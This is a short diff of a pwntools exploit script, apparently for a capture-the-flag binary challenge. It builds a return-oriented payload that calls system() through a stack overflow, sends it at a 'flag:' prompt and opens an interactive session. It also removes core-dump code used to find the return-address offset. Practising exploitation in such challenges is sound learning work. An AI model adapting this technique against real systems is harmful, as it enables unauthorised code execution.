@@ -24,7 +24,7 @@ log.info('Get Addresses')
 #info("%#x execute string", execute_string)
 #execute_string = p64(next(elf.search(b'date')))
 
-execute_string = p64(0x004040b0)
+execute_string = p64(0x4040b0)
 
 #call_system = next(elf.search(asm('call system'), executable = True)))[0]
 #info("%#x execute string", execute_string)
@@ -56,15 +56,6 @@ payload = padding + POP_RDI + execute_string + system_address
 log.info('Send Payload')
 io.sendlineafter('flag: ', payload)     #flag
 
-io.wait()
-
-core = io.corefile
-stack = core.rsp
-info("rsp = %#x", stack)
-pattern = core.read(stack, 4)
-info("cyclic pattern = %s", pattern.decode())
-rip_offset = cyclic_find(pattern)
-info("rip offset is = %d", rip_offset)
 
 io.interactive()
 
